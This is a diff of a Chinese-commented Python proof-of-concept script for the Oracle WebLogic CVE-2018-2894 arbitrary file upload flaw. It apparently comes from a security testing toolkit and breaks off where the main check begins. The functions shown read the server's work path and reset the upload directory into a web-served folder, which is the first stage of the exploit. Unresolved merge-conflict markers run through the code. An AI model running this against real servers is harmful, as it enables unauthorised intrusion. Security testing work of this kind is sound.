@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 # coding:utf-8
+<<<<<<< HEAD
 """
 WebLogic CVE-2018-2894 POC 检测脚本
 
@@ -35,11 +36,14 @@ Oracle WebLogic Server 的 Web Service Test Page 存在任意文件上传漏洞�
     此POC仅用于安全测试和授权的渗透测试，请勿用于非法用途。
 """
 
+=======
+>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
 import re
 import time
 import requests
 import xml.etree.ElementTree as ET
 
+<<<<<<< HEAD
 def get_current_work_path(host, timeout=10):
     """
     获取当前工作路径
@@ -54,6 +58,10 @@ def get_current_work_path(host, timeout=10):
     Raises:
         Exception: 如果无法获取工作路径
     """
+=======
+
+def get_current_work_path(host, timeout=10):
+>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
     geturl = host + "/ws_utc/resources/setting/options/general"
     ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'}
     values = []
@@ -83,6 +91,7 @@ def get_current_work_path(host, timeout=10):
         # print("[-] Cannot get current work path\n")
         raise Exception("[-] Cannot get current work path")
 
+<<<<<<< HEAD
 def get_new_work_path(host, timeout=10):
     """
     获取新的上传路径
@@ -94,6 +103,10 @@ def get_new_work_path(host, timeout=10):
     Returns:
         str: 新的上传路径
     """
+=======
+
+def get_new_work_path(host, timeout=10):
+>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
     origin_work_path = get_current_work_path(host, timeout)
     works = "/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"
     if "user_projects" in origin_work_path:
@@ -113,6 +126,7 @@ def get_new_work_path(host, timeout=10):
         # print("[*] cannot handle current work home dir: {}".format(origin_work_path))
     return current_work_home
 
+<<<<<<< HEAD
 def set_new_upload_path(host, path, timeout=10):
     """
     设置新的上传路径
@@ -128,6 +142,10 @@ def set_new_upload_path(host, path, timeout=10):
     Raises:
         Exception: 如果设置失败
     """
+=======
+
+def set_new_upload_path(host, path, timeout=10):
+>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
     data = {
         "setting_id": "general",
         "BasicConfigOptions.workDir": path,
@@ -143,6 +161,7 @@ def set_new_upload_path(host, path, timeout=10):
         # print("[-] Change New Upload Path failed")
         raise Exception("Change New Upload Path failed")
 
+<<<<<<< HEAD
 def poc(url, timeout=10):
     """
     检测目标是否存在 WebLogic CVE-2018-2894 漏洞
@@ -154,6 +173,10 @@ def poc(url, timeout=10):
     Returns:
         tuple: (是否存在漏洞, 结果消息)
     """
+=======
+
+def poc(url, timeout=10):
+>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
     username = "admin"
     if url.endswith('/'): url = url[:-1]
     
